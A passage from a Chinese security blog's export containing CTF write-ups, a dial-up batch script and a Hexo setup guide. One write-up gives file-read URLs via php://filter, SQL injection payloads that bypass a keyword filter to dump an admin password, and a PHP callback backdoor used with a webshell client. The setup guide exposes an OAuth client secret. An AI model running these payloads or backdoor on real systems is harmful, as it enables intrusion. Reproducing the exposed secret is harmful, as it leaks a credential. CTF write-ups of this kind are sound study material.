74, 75, 76, 77, 79, 80, 81, 82, 83, 84, 85, 86, 87, 88, 89, 90, 91, 92, 93, 94, 95], [132, 133, 142, 144, 145, 146, 147, 148, 149, 150, 155, 159, 192, 193, 194, 195, 196, 197, 198, 199, 200, 201, 202, 203, 204, 205, 207, 208, 209, 210, 211, 212, 213, 214, 215, 216, 217, 218, 219, 220, 221, 222, 223], [161, 166, 167, 170, 173, 176, 177, 178, 179, 180, 181, 182, 183, 186, 188], [1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 68, 70, 72, 76, 78, 80, 81, 82, 83, 84, 86, 87, 90, 93], [128, 129, 130, 131, 132, 133, 134, 135, 136, 137, 138, 139, 140, 141, 142, 143, 144, 145, 147, 148, 149, 150, 151, 152, 153, 154, 155, 156, 157, 158, 159, 195, 196, 200, 201, 202, 204, 205, 206, 207, 208, 210, 213, 216, 217, 223], [33, 39, 43, 44, 52, 55, 57, 58, 59, 60, 61, 62, 63]]&#125; 最后结果12[186, 31, 145, 178, 83, 205, 62] Cryptography is the practice and study of techniques for, among other things, secure communication in the presence of attackers. Cryptography has been used for hundreds, if not thousands, of years, but traditional cryptosystems were designed and evaluated in a fairly ad hoc manner. For example, the Vigenere encryption scheme was thought to be secure for decades after it was invented, but we now know, and this exercise demonstrates, that it can be broken very easily.[Finished in 2.2s] 解密代码全文123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136# coding:utf8# by https://findneo.github.io/def getCipher(file='code.txt'): '''从文件中读取十六进制串，返回十六进制数组 ''' c = open(file).read() codeintlist = [] codeintlist.extend( (map(lambda i: int(c[i:i + 2], 16), range(0, len(c), 2)))) return codeintlistdef getKeyPool(cipher, stepSet, plainSet, keySet): ''' 传入的密文串、明文字符集、密钥字符集、密钥长度范围均作为数字列表处理.形如[0x11,0x22,0x33] 返回一个字典，以可能的密钥长度为键，以对应的每一字节的密钥字符集构成的列表为值，密钥字符集为数字列表。 形如&#123; 1:[[0x11]], 3:[ [0x11,0x33,0x46], [0x22,0x58], [0x33] ] &#125; ''' keyPool = dict() for step in stepSet: maybe = [None] * step for pos in xrange(step): maybe[pos] = [] for k in keySet: flag = 1 for c in cipher[pos::step]: if c ^ k not in plainSet: flag = 0 if flag: maybe[pos].append(k) for posPool in maybe: if len(posPool) == 0: maybe = [] break if len(maybe) != 0: keyPool[step] = maybe return keyPooldef calCorrelation(cpool): '''传入字典，形如&#123;'e':2,'p':3&#125; 返回可能性，0~1,值越大可能性越大 (correlation between the decrypted column letter frequencies and the relative letter frequencies for normal English text) ''' frequencies = &#123;"e": 0.12702, "t": 0.09056, "a": 0.08167, "o": 0.07507, "i": 0.06966, "n": 0.06749, "s": 0.06327, "h": 0.06094, "r": 0.05987, "d": 0.04253, "l": 0.04025, "c": 0.02782, "u": 0.02758, "m": 0.02406, "w": 0.02360, "f": 0.02228, "g": 0.02015, "y": 0.01974, "p": 0.01929, "b": 0.01492, "v": 0.00978, "k": 0.00772, "j": 0.00153, "x": 0.00150, "q": 0.00095, "z": 0.00074&#125; relative = 0.0 total = 0 fpool = 'etaoinshrdlcumwfgypbvkjxqz' total = sum(cpool.values()) # 总和应包括字母和其他可见字符 for i in cpool.keys(): if i in fpool: relative += frequencies[i] * cpool[i] / total return relativedef analyseFrequency(cfreq): key = [] for posFreq in cfreq: mostRelative = 0 for keyChr in posFreq.keys(): r = calCorrelation(posFreq[keyChr]) if r &gt; mostRelative: mostRelative = r keychar = keyChr key.append(keychar) return keydef getFrequency(cipher, keyPoolList): ''' 传入的密文作为数字列表处理 传入密钥的字符集应为列表，依次包含各字节字符集。 形如[[0x11,0x12],[0x22]] 返回字频列表，依次为各字节字符集中每一字符作为密钥组成部分时对应的明文字频 形如[&#123; 0x11:&#123;'a':2,'b':3&#125;, 0x12:&#123;'e':6&#125; &#125;, &#123; 0x22:&#123;'g':1&#125; &#125;] ''' freqList = [] keyLen = len(keyPoolList) for i in xrange(keyLen): posFreq = dict() for k in keyPoolList[i]: posFreq[k] = dict() for c in cipher[i::keyLen]: p = chr(k ^ c) posFreq[k][p] = posFreq[k][p] + 1 if p in posFreq[k] else 1 freqList.append(posFreq) return freqListdef vigenereDecrypt(cipher, key): plain = '' cur = 0 ll = len(key) for c in cipher: plain += chr(c ^ key[cur]) cur = (cur + 1) % ll return plaindef main(): ps = [] ks = [] ss = [] ps.extend(xrange(32, 127)) ks.extend(xrange(0xff + 1)) ss.extend(xrange(1, 14)) cipher = getCipher() keyPool = getKeyPool(cipher=cipher, stepSet=ss, plainSet=ps, keySet=ks) for i in keyPool: freq = getFrequency(cipher, keyPool[i]) key = analyseFrequency(freq) plain = vigenereDecrypt(cipher, key) print key, plainif __name__ == '__main__': main() 题目备份12345678910111213141516171819202122232425262728293031323334353637http://ctf.nuptsast.com/static/uploads/13706e3281c1fb0c04417d3452cb745b/encode.cpp#include &lt;stdio.h&gt;#define KEY_LENGTH 2 // Can be anything from 1 to 13main()&#123; unsigned char ch; FILE *fpIn, *fpOut; int i; unsigned char key[KEY_LENGTH] = &#123;0x00, 0x00&#125;; /* of course, I did not use the all-0s key to encrypt */ fpIn = fopen("ptext.txt", "r"); fpOut = fopen("ctext.txt", "w"); i=0; while (fscanf(fpIn, "%c", &amp;ch) != EOF) &#123; /* avoid encrypting newline characters */ /* In a "real-world" implementation of the Vigenere cipher, every ASCII character in the plaintext would be encrypted. However, I want to avoid encrypting newlines here because it makes recovering the plaintext slightly more difficult... */ /* ...and my goal is not to create "production-quality" code =) */ if (ch!='\n') &#123; fprintf(fpOut, "%02X", ch ^ key[i % KEY_LENGTH]); // ^ is logical XOR i++; &#125; &#125; fclose(fpIn); fclose(fpOut); return;&#125; ----------------------------------------------------------------------------------http://ctf.nuptsast.com/static/uploads/9a27a6c8b9fb7b8d2a07ad94924c02e5/code.txtF96DE8C227A259C87EE1DA2AED57C93FE5DA36ED4EC87EF2C63AAE5B9A7EFFD673BE4ACF7BE8923CAB1ECE7AF2DA3DA44FCF7AE29235A24C963FF0DF3CA3599A70E5DA36BF1ECE77F8DC34BE129A6CF4D126BF5B9A7CFEDF3EB850D37CF0C63AA2509A76FF9227A55B9A6FE3D720A850D97AB1DD35ED5FCE6BF0D138A84CC931B1F121B44ECE70F6C032BD56C33FF9D320ED5CDF7AFF9226BE5BDE3FF7DD21ED56CF71F5C036A94D963FF8D473A351CE3FE5DA3CB84DDB71F5C17FED51DC3FE8D732BF4D963FF3C727ED4AC87EF5DB27A451D47EFD9230BF47CA6BFEC12ABE4ADF72E29224A84CDF3FF5D720A459D47AF59232A35A9A7AE7D33FB85FCE7AF5923AA31EDB3FF7D33ABF52C33FF0D673A551D93FFCD33DA35BC831B1F43CBF1EDF67F0DF23A15B963FE5DA36ED68D378F4DC36BF5B9A7AFFD121B44ECE76FEDC73BE5DD27AFCD773BA5FC93FE5DA3CB859D26BB1C63CED5CDF3FE2D730B84CDF3FF7DD21ED5ADF7CF0D636BE1EDB79E5D721ED57CE3FE6D320ED57D469F4DC27A85A963FF3C727ED49DF3FFFDD24ED55D470E69E73AC50DE3FE5DA3ABE1EDF67F4C030A44DDF3FF5D73EA250C96BE3D327A84D963FE5DA32B91ED36BB1D132A31ED87AB1D021A255DF71B1C436BF479A7AF0C13AA14794 参考链接 https://en.wikipedia.org/wiki/Index_of_coincidence https://en.wikipedia.org/wiki/One-time_pad https://en.wikipedia.org/wiki/Vigen%C3%A8re_cipher https://en.wikipedia.org/wiki/Letter_frequency https://www.lijinma.com/blog/2014/05/29/amazing-xor/ http://blog.csdn.net/qq_31344951/article/details/77934717]]></content>
      <categories>
        <category>writeup</category>
      </categories>
      <tags>
        <tag>ctf</tag>
        <tag>密码学</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[南邮CTF平台综合题2writeup]]></title>
    <url>%2F171004NuptZonghe2WP%2F</url>
    <content type="text"><![CDATA[非xss题 但是欢迎留言~地址：get the flag 读取源码在页面底部发现一个这样的链接：http://cms.nuptzj.cn/about.php?file=sm.txt ，说明题目提供了读取文件功能，如果使用 file://协议 读取，HTML预留字符会以字符实体显示，看起来不方便，所以也可以编码读取后再本地解码。 12345678910111213http://cms.nuptzj.cn/about.php?file=php://filter/convert.base64-encode/resource=filename在拿到的文件里搜索 ".php" ，顺藤摸瓜，能找到并读取到的文件有： sm.txt about.php index.php passencode.php say.php antixss.php so.php preview.php antiinject.php ----------------------------- 知道有 loginxlcteam目录或文件 和 config.php 但还读不到 ；还不知道有list.php ,xlcteam.php 关于file://协议 file://协议 (RFC8089 )是用来访问本地文件系统的，因为文件系统 是 PHP 使用的默认封装协议，因此在fopen()、 copy()、 file_exists() 、 file_get_contents()和 filesize() 等文件系统函数中是支持的。 在谷歌/火狐浏览器的URL框里输入 file:///D:/ 或者在Linux命令行里敲 lynx file:/// 都可以看到效果。 PHP文档 提供的用法如下： /path/to/file.ext relative/path/to/file.ext fileInCwd.ext C:/path/to/winfile.ext C:\path\to\winfile.ext \smbserver\share\path\to\winfile.ext file:///path/to/file.ext 关于PHP的过滤器(php://filter) php://filter 和 可用的过滤器列表。主要用在数据流内容读取之前做些筛选过滤，可指定过滤器应用在读模式还是写模式，不指定则两者都应用，也可复合使用多个过滤器，使用管道符隔开即可。 对于CTFer典型的用法像是这样： php://filter/read= &lt; filter list to apply to read chain &gt;/resource= &lt; stream to be filtered &gt; php://filter/read=string.toupper|string.rot13/resource=https://findneo.github.io/ php://filter/convert.base64-encode/resource=filename 常用过滤器列表： String Filters string.rot13 string.toupper string.tolower string.strip_tags Conversion Filters convert.base64-encode &amp; convert.base64-decode convert.quoted-printable-encode &amp; convert.quoted-printable-decode Compression Filters Encryption Filters 注入全局搜索 mysql_query ，发现 say.php,so.php,index.php 都存在数据库操作。选择 so.php 下手。 123456789101112131415161718192021222324252627282930313233/*so.php*/&lt;?phpif($_SERVER['HTTP_USER_AGENT']!="Xlcteam Browser")&#123;echo '万恶滴黑阔，本功能只有用本公司开发的浏览器才可以用喔~'; exit();&#125;$id=$_POST['soid'];include 'config.php';include 'antiinject.php';include 'antixss.php';$id=antiinject($id);$con = mysql_connect($db_address,$db_user,$db_pass) or die("不能连接到数据库！！".mysql_error());mysql_select_db($db_name,$con);$id=mysql_real_escape_string($id);$result=mysql_query("SELECT * FROM `message` WHERE display=1 AND id=$id");$rs=mysql_fetch_array($result);echo htmlspecialchars($rs['nice']).':&lt;br /&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;'.antixss($rs['say']).'&lt;br /&gt;';mysql_free_result($result);mysql_free_result($file);mysql_close($con);?&gt;---------------------------------------------------------------------------------------/*antiinject.php*/&lt;?phpfunction antiinject($content)&#123;$keyword=array("select","union","and","from",' ',"'",";",'"',"char","or","count","master","name","pass","admin","+","-","order","=");$info=strtolower($content);for($i=0;$i&lt;=count($keyword);$i++)&#123; $info=str_replace($keyword[$i], '',$info);&#125;return $info;&#125;?&gt; 关注 3、11、14、15行。 burp抓包，修改 User-Agent 字段即可。 antiinject() 过滤规则是按黑名单依次把关键字删除。 用黑名单里最后一个关键字 = 分隔即可绕过对多字符关键字的过滤。 用 /**/ 代替空格符。 单字符关键字不太会弄，也许可以用各种编码绕过，不过我们暂时未必需要，有空格和这些多字符关键字，再加上不在黑名单里的 &lt;&gt;/() 已经可以开始搞事了。 mysql_real_escape_string() 的功能是对\x00, \n, \r, \, &#39;, &quot; , \x1a(撤销键,ctrl+z) 加反斜杠转义，我们不用这些字符就是了。 15行处将处理过的参数直接拼接到查询语句，因为查询结果有多列，又没有逗号可用，不好用内联注入，于是尝试基于逻辑的注入。数据库结构在 sm.txt 已经给出。 12345678910111213141516171819我们想要在数据库执行的查询语句是这样：SELECT * FROM `message` WHERE display=1 AND id=1 and ascii(mid((select userpass from admin)from 1 for 1))&gt;65因为没法用空格，所以实际上是这样：SELECT * FROM `message` WHERE display=1 AND id= 1/**/and/**/ascii(mid((select/**/userpass/**/from/**/admin)from/**/1/**/for/**/1))&gt;65希望经过过滤的 id 值为：1/**/and/**/ascii(mid((select/**/userpass/**/from/**/admin)from/**/1/**/for/**/1))&gt;65向 so.php post过去的参数应该是：soid=1/**/an=d/**/ascii(mid((selec=t/**/userpas=s/**/fro=m/**/admi=n)fro=m/**/1/**/fo=r/**/1))&gt;65使用burp爆破soid=1/**/an=d/**/ascii(mid((selec=t/**/userpas=s/**/fro=m/**/admi=n)fro=m/**/§1§/**/fo=r/**/1))&gt;§65§使用 Cluster Bomb 模式，第一个payload 为 [1-40] ，第二个为 [31,32,47-57](经过几次尝试发现usepass字段只有[ \d] )得到[49,48,50,32,49,49,55,32,57,57,32,49,48,55,32,49,49,52,32,48,49,55,32,49,49,48,32,49,49,54,32,49,49,55]也就是[102 ,117 ,99 ,107 ,114 ,117 ,110 ,116 ,117]即funckruntu，访问loginxlcteam登陆即可进后台得知有管理员留的后门 xlcteam.php ，于是读一下这个文件 意外看别人的writeup时惊喜的发现原来并没有过滤逗号，这意味着可以一次注出来管理员密码！所以深夜里我是有些激动的。 123soid=1/**/an=d/**/0/**/unio=n/**/selec=t/**/null,usernam=e,userpas=s,null/**/fro=m/**/admi=n//当然，在充分掌握数据库结构前需要一些尝试。 使用回调后门回调后门似乎是 phithon 师傅最先这样称呼的，在 创造tips的秘籍——PHP回调后门 里做了具体介绍。 123456789//xlcteam.php&lt;?php$e = $_REQUEST['www'];$arr = array($_POST['wtf'] =&gt; '|.*|e',);array_walk($arr, $e, '');?&gt; //使用菜刀连接即可。 //url : http://cms.nuptzj.cn/xlcteam.php?www=preg_replace //密码: wtf 菜刀连上后拿到所有文件，发现 config.php 里有数据库配置，于是就可以操作整个数据库了。 是的，中午吃的是美味的黄焖鸡 \o/]]></content>
      <categories>
        <category>writeup</category>
      </categories>
      <tags>
        <tag>ctf</tag>
        <tag>sqli</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[命令行拨号上网]]></title>
    <url>%2F171003CmdSurfnet%2F</url>
    <content type="text"><![CDATA[校园网使用PPPoE拨号上网，每次都通过图形化界面通断网络不太方便，希望能一键上网一键下线，于是写了个小脚本。 配置好相关参数后保存为 C:\Windows\System32\surf.bat ，重启命令行即可使用 surf 命令通断网络，常用的话甚至只要 win+r-&gt;enter就可以自由迅速地上线下线啦。把下面第二十行的注释去掉可以在联网同时打开ss，有些缺憾的是还没有实现断网时退出ss。 流程控制参考了Batch Guide by Terry Newton 。 123456789101112131415161718192021REM 校园网使用PPPoE拨号上网，将文件内容存为 C:\Windows\System32\surf.bat ，可以命令行拨号上网REM 可自行加开ss@echo offset name=net REM 修改net 为拨号连接的名字set phone=13323333333 REM 修改为拨号上网手机号set pass=2333 REM 运营商提供的密码rasdial | findstr 已连接 &gt; nulif errorlevel 1 goto notfoundrem string was foundrasdial %name% /disconnect goto endfind:notfoundrem string was not foundrasdial %name% %phone% %pass%if "%1" neq "" goto :endfindREM start C:\path\to\your\Shadowsocks\Shadowsocks.exe:endfind 2017/10/05 更新代码添加第十九行，如果ss已经在运行，只要传入一个参数就不会尝试开启啦。 2018-03-12重写逻辑更清晰，添加重连功能，有时被ban可以起到刷新IP的作用。 surf r 断开并重新连接 surf 通&lt;=&gt;断 surf any 连接但不启动shadow socks 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647@echo offset name=net REM 修改net 为拨号连接的名字set phone=13323333333 REM 修改为拨号上网手机号set pass=2333 REM 运营商提供的密码 rasdial | findstr 已连接 &gt; nulset is_connect=%errorlevel%echo %is_connect%if %is_connect%==1 goto not_connectedif %is_connect%==0 goto connected:connectedif "%1"=="r" goto re_connectgoto disconnect:not_connectedif "%1"=="" goto connect_with_ssgoto connect_without_ssrem ==========================================:re_connectrasdial %name% /disconnectping 127.1 -n 2 &gt; nulrasdial %name% %phone% %pass%ipconfig | find "IPv4"goto end:disconnectrasdial %name% /disconnectgoto end:connect_without_ssrasdial %name% %phone% %pass%ipconfig | find "IPv4"goto end:connect_with_ssrasdial %name% %phone% %pass%start D:\path\to\Shadowsocks-4.0.6\Shadowsocks.exeipconfig | find "IPv4"goto end:end]]></content>
      <categories>
        <category>备忘</category>
      </categories>
      <tags>
        <tag>hacklife</tag>
        <tag>code</tag>
        <tag>Batch</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[博客搭建与自定义]]></title>
    <url>%2F170926HexoConfig%2F</url>
    <content type="text"><![CDATA[利用GitHub page和hexo搭建一个个人博客主要分三步： 使用hexo在本地搭建一个可访问的博客。 自定义博客样式。 将博客发布到GitHub page。 hexo本地搭建可访问博客官方文档讲的很详细了。 123456789101112131415161718192021222324252627282930313233#基于Windows 10 ; hexo: 3.3.9 ; next Release 5.0.0#1.安装 Node.js (https://nodejs.org/en/download/)#2.安装 Git for Windows (https://github.com/waylau/git-for-win)#3.安装 hexo# 打开cmd.exenpm install -g hexo-cli#4. 创建博客# 进入想要放博客文件的目录hexo init &lt;folder&gt;cd &lt;folder&gt;npm install# 到此为止已经可以看到效果# hexo clean;hexo g;hexo s [--debug]#5. 自选主题，如next (http://theme-next.iissnan.com/getting-started.html)cd themesgit clone https://github.com/iissnan/hexo-theme-next themes/next# 到此为止目录结构如下.├── _config.yml [站点配置文件]├── ...├── source| ├── _drafts| └── _posts└── themes ├──landscape └──next └──_config.yml [博客配置文件] 自定义博客样式blog/_config.ymlgit commit blog/themes/next/_config.ymlgit commit 版权声明 ，参考blog\themes\next\layout_macro\post-copyright.swig123456789101112131415161718&lt;ul class="post-copyright"&gt; &lt;li class="post-copyright-title"&gt; &lt;strong&gt;&#123;&#123; __('post.copyright.title') + __('symbol.colon') &#125;&#125;&lt;/strong&gt; &lt;a href="&#123;&#123; post.permalink &#125;&#125;" &gt;&#123;&#123; post.title &#125;&#125;&lt;/a&gt; &lt;/li&gt; &lt;li class="post-copyright-author"&gt; &lt;strong&gt;&#123;&#123; __('post.copyright.author') + __('symbol.colon') &#125;&#125;&lt;/strong&gt; &lt;a href="&#123;&#123;config.url&#125;&#125;" title="&#123;&#123;__('post.copyright.welcome')&#125;&#125;"&gt; &#123;&#123; config.author &#125;&#125;&lt;/a&gt; &lt;/li&gt; &lt;li class="post-copyright-link"&gt; &lt;strong&gt;&#123;&#123; __('post.copyright.link') + __('symbol.colon') &#125;&#125;&lt;/strong&gt; &lt;a href="&#123;&#123; post.permalink &#125;&#125;" title="&#123;&#123; post.title &#125;&#125;"&gt;&#123;&#123; post.permalink &#125;&#125;&lt;/a&gt; &lt;/li&gt; &lt;li class="post-copyright-license"&gt; &lt;strong&gt;&#123;&#123; __('post.copyright.license_title') + __('symbol.colon') &#125;&#125; &lt;/strong&gt; &#123;&#123; __('post.copyright.license_content', theme.post_copyright.license_url, theme.post_copyright.license) &#125;&#125; &lt;/li&gt;&lt;/ul&gt; blog\themes\next\languages\zh-Hans.yml12345678910##部分post: copyright: title: 本文标题 author: 文章作者 link: 原始链接 license_title: 版权声明 welcome: '访问 findneo 的个人博客' license_content: 本文在&lt;i class="fa fa-creative-commons"&gt;&lt;/i&gt; &lt;a href="%s" rel="external nofollow" target="_blank"&gt;%s&lt;/a&gt;下发布。转载请保留原始链接。 文章模板 blog\scaffolds\post.md12345678---title: &#123;&#123; title &#125;&#125;date: &#123;&#123; date &#125;&#125;categories: tags: [] ###可以直接用tags: [tag1,tag2]代替多行tagsdescription: ###当主题配置文件中的excerpt_description开启时，会把这一部分作为文章摘要--- 将博客发布到GitHub page网站内容发布官方文档 123创建GitHub账户，新建username.github.io项目，为git配置sshnpm install hexo-deployer-git --savehexo d 开发内容与配置文件备份由于主题next本身是git项目，所以直接在blog文件夹内git init，然后整个blog文件夹(当然blog/.gitignore已经排除了没用的子文件夹)push到GitHub会发现next文件夹整个是空的。因此要做git库的嵌套处理，但比较麻烦，而且似乎不适用于这种情况。所以最后我采用在第一次push前把blog\themes\next\.git 重命名为 blog\themes\next\now-donot-use.git ，于是blog无法识别到next这个项目，成功地备份了所有配置。将来如果要更新主题，只需重命名回来，然后 git pull ，更新完改回去即可。 本地调试完成后，只需在git bash里执行./ok [&quot;you commit comment&quot;]即可完成部署和配置备份，ok文件内容如下： 12345678910hexo cleanhexo dgit add -Aif [ "$1" = "" ]thengit commit -m "Update."elsegit commit -m "$1"figit push emmm,重装系统了123456789101112131415161718192021222324252627从头开始，安装git fro windows，配置sshgit config --global user.name your_namegit config --global user.email your_mailssh-keygen -t rsa -b 4096 -C "your_email@example.com"clip &lt; ~/.ssh/id_rsa.pubssh -T git@github.com 验证ssh可用-------------------------------------在GitHub新建findneo.github.iogit clone https://github.com/findneo/findneo.github.io.gitcd findneo.github.iogit checkout -b bakeup 新建备份分支并设为默认分支，因为后面只手动操作这个分支，master分支由hexo-deployer-git自动操作 hexo init tmpcp -a tmp/* ./rm -rf tmpnpm install --save hexo-deployer-gitnpm install --save hexo-generator-baidu-sitemapnpm install --save hexo-generator-sitemapnpm install --save hexo-generator-searchdbnpm install --save hexo-generator-feed npm i --save hexo-wordcount------------------------------------- 在站点配置文件中配置git-deployer为master分支git add . git commit -m "..." git push origin bakeuphexo d -g 参考了这位朋友的备份方法，很棒，(๑•̀ㅂ•́)و✧。 列个软件清单： WSL、everything、 Typora 、shadow socks、chrome、firefox、notepad++ 、一键上网脚本、 sublime、印象笔记、python2/3、git for windows、vmware/kali/win7、AgentRansack、7z、射手影音、SumatraPDF、微软办公系列 WPS Office 2013 个人版 、IObitUninstaller、snipaste burpsuite、fiddler、wireshark、nmap、sqlmap、winhex、ziperello、weevely、winhex、御剑、awvs 添加gitment作为评论系统项目介绍:https://imsun.net/posts/gitment-introduction/ 在 findneo.github.io\themes\next\layout_partials\comments.swig 的倒数第二个endif前添加 12345678910111213141516&#123;% elseif config.gitment.owner and config.gitment.commentrepo and config.gitment.clientid and config.gitment.clientsecret %&#125; &lt;div id="gitmentContainer"&gt;&lt;/div&gt; &lt;link rel="stylesheet" href="https://imsun.github.io/gitment/style/default.css"&gt; &lt;script src="https://imsun.github.io/gitment/dist/gitment.browser.js"&gt;&lt;/script&gt; &lt;script type="text/javascript"&gt; var gitment = new Gitment(&#123; id: '&#123;&#123;page.title&#125;&#125;', owner: '&#123;&#123;config.gitment.owner&#125;&#125;', repo: '&#123;&#123;config.gitment.commentrepo&#125;&#125;', oauth: &#123; client_id: '&#123;&#123;config.gitment.clientid&#125;&#125;', client_secret: '&#123;&#123;config.gitment.clientsecret&#125;&#125;', &#125;, &#125;) gitment.render('gitmentContainer') &lt;/script&gt; 然后在站点配置文件末尾添加 12345gitment: owner: findneo commentrepo: findneo.github.io clientid: a3407310dfbeafbfe55a clientsecret: ad6c900a0fce4a44b8eeb40e1790ee7c7cc7575d 需要注意的是每发布一篇文章都需要把该页面初始化一下其他人才可以评论，这是因为评论基于issue，并不是bug 单独控制每篇文章版权声明给 themes\next\layout\_macro\post-copyright.swig 加上控制流程，通过每个post的 front-matter控制，遇到想不加版权声明的文章就在头部加上 notoriginal: true 即可，不影响已有文章。 123&#123;% if not post.notoriginal %&#125;foo&#123;% endif %&#125;]]></content>
      <categories>
        <category>备忘</category>
      </categories>
      <tags>
        <tag>hacklife</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[南京邮电大学网络攻防训练平台writeup]]></title>
    <url>%2F170924NuptCTFWP%2F</url>
    <content type="text"><![CDATA[南邮CTF平台网址： http://ctf.nuptsast.com/challenges http://ctf.nuptzj.cn/challenges WEB签到题nctf{flag_admiaanaaaaaaaaaaa} ctrl+u或右键查看源代码即可。在CTF比赛中，代码注释、页面隐藏元素、超链接指向的其他页面、HTTP响应头部都可能隐藏flag或提示信息。在渗透测试中，开发者留下的多余注释和测试页面有时也能提供线索。 md5 collisionnctf{md5_collision_is_easy} 123456789101112&lt;?php$md51 = md5('QNKCDZO');$a = @$_GET['a'];$md52 = @md5($a);if(isset($a))&#123;if ($a != 'QNKCDZO' &amp;&amp; $md51 == $md52) &#123; echo "nctf&#123;*****************&#125;";&#125; else &#123; echo "false!!!";&#125;&#125;else&#123;echo "please input a";&#125;?&gt; 利用PHP弱类型，前人发现md5(‘QNKCDZO’)=’0e830400451993494058024219903391’，md5(‘240610708’)=’0e462097431906509019562988736854’，而因为使用松散比较的缘故，var_dump(‘0e830400451993494058024219903391’==’0e462097431906509019562988736854’);值为真，因此访问 http://chinalover.sinaapp.com/web19/?a=240610708 即可。 1、在PHP中，@被称为错误控制操作符(error control operator)，前置@符号的表达式产生的任何错误都将被忽略。 2、1992年发布的MD5算法是一种广泛使用的哈希算法，最初被设计用来作为加密算法，在被证明不安全后只能用来做数据完整性校验。MD5算法为消息产生128位摘要，常表示为32位十六进制串，由[0-9a-e]组成。 3、PHP的比较操作符主要有两类——松散比较和严格比较，于是就有了equal(==)和Identical(===)两种相等，主要区别在于前者会在比较前根据上下文对操作数进行类型转换(type juggling)而后者不会。这种juggle总的来说利大于弊，但确实容易玩脱。 ​ 此处只谈涉及字符串和数值的松散比较。根据本地实验结合官方文档，我们可以总结出来，这种类型转换的行为关键在于两点，一是判断字符串是否处于数字语境(in a numeric context)，二是如何为处于数字语境的字符串取值。 ​ 当操作符为==时，若有一个操作数为int/float或两个操作数is_numeric()均为真，则判断为处于数字语境；当操作符为数字操作符，如+-/*时，则判断为处于数字语境。（此段为实验支持下的个人猜测，未找到依据。） ​ 根据PHP官方文档 ，如果一个字符串被认定处于数字语境，那么它的取值取决于字符串的前面一部分，如果字符串以有效的数字型数据【Valid numeric data ，正则匹配表达为 \s(\d+\.?\d*|\.\d+)([eE]\d+)?\s，含有[eE]的视为科学计数法】开头，那么字符串取开头部分的数值，否则取0 。实验发现1e也被取值为1而不是0，这有点奇怪 :( 123456789101112131415&lt;?php $a1=1; $b1="1"; $c1="1padding"; $a2=.1; $b2=".1"; $c2=".1padding"; $a3=1.; $b3="1."; $c3="1.padding"; $a4=1.1; $b4="1.1"; $c4="1.1padding"; $a5=1.e1; $b5="1.e1"; $c5="1.e1padding"; $a6=.1e1; $b6=".1e1"; $c6=".1e1padding"; $a7=1.1e1; $b7="1.1e1"; $c7="1.1e1padding"; $a8=1e1; $b8="1e1"; $c8="1e1padding"; var_dump($a8==$b8);//true var_dump($a8==$c8);//true var_dump($b8==$c8);//false var_dump($a8+$b8);//float(20) var_dump($a8+$c8);//float(20) var_dump($b8+$c8);//float(20) 4、其他符合/0[eE]\d{30}/的MD5值： string(strlen($var)) $var string(strlen(md5($var))) md5($var) QNKCDZO 0e830400451993494058024219903391 s878926199a 0e545993274517709034328855841020 s155964671a 0e342768416822451524974117254469 s1502113478a 0e861580163291561247404381396064 s214587387a 0e848240448830537924465865611904 s878926199a 0e545993274517709034328855841020 s1091221200a 0e940624217856561557816327384675 s1885207154a 0e509367213418206700842008763514 s1836677006a 0e481036490867661113260034900752 s1184209335a 0e072485820392773389523109082030 s1665632922a 0e731198061491163073197128363787 s532378020a 0e220463095855511507588041205815 240610708 0e462097431906509019562988736854 签到2123456789&lt;html&gt;&lt;meta http-equiv="Content-Type" content="text/html; charset=UTF-8" /&gt;尚未登录或口令错误&lt;form action="./index.php" method="post"&gt; &lt;p&gt;输入框：&lt;input type="password" value="" name="text1" maxlength="10"&gt;&lt;br&gt; 请输入口令：zhimakaimen &lt;input type="submit" value="开门"&gt;&lt;/form&gt;&lt;/html&gt; nctf{follow_me_to_exploit} maxlength=”10” 而口令 zhimakaimen 有11位，数据在前端就会被截断掉。这时有两种做法，一种是在chrome/Firefox浏览器的开发者工具中将 maxlength=”10” 字段修改为 maxlength=”11” 或是更大的值；另一种是使用hackbar或burp直接向 http://teamxlc.sinaapp.com/web1/02298884f0724c04293b4d8c0178615e/index.php post text1=zhimakaimen 。客户端的行为都是可控的，所以熟悉HTML和JavaScript是重要的。 这题不是WEBnctf{photo_can_also_hid3_msg} 下载图片并用winhex打开，在末尾发现字符串。一个简单的隐写。 层层递进nctf{this_is_a_fl4g} 查看源代码，跟随链接，依次访问SO.html -&gt; S0.html-&gt;SO.htm -&gt;S0.htm-&gt;404.html ，在最后一个页面里的注释部分可找到flag。还是查看源代码，细心就会发现异常。 AAencodenctf{javascript_aaencode} aaencode是一种把js代码编码成日语颜文字的编码方式，使用Unicode编码查看，然后 在线解码 。工具作者颇有幽默感。 单身二十年nctf{yougotit_script_now} 访问 http://chinalover.sinaapp.com/web8/search_key.php 会被重定向到 http://chinalover.sinaapp.com/web8/no_key_is_here_forever.php ，重定向会被浏览器自动处理，burp抓包则可见flag。 你从哪里来 你是从 google 来的吗？传送门：题目地址 nctf{http_referer} 给请求加上referer: https://www.google.com即可。从https://github.com/otakekumi/NUPT_Challenges/blob/master/WEB/%E4%BD%A0%E4%BB%8E%E5%93%AA%E9%87%8C%E6%9D%A5/index.php 看到源代码可能有点问题。 12345678&lt;?php$referer = $_SERVER['referer'];if ($referer === "https://www.google.com/ " || $referer === "https://www.google.com")&#123; echo "nctf&#123;http_referer&#125;";&#125;else&#123; echo "are you from google?";&#125;?&gt; 第二行应该是$referer = $_SERVER[&#39;HTTP_REFERER&#39;]; ？ php decode123456789&lt;?phpfunction CLsI($ZzvSWE) &#123; $ZzvSWE = gzinflate(base64_decode($ZzvSWE)); for ($i = 0; $i &lt; strlen($ZzvSWE); $i++) &#123; $ZzvSWE[$i] = chr(ord($ZzvSWE[$i]) - 1); &#125; return $ZzvSWE;&#125;echo CLsI("+7DnQGFmYVZ+eoGmlg0fd3puUoZ1fkppek1GdVZhQnJSSZq5aUImGNQBAA=="); nctf{gzip_base64_hhhhhh} 运行代码即可。 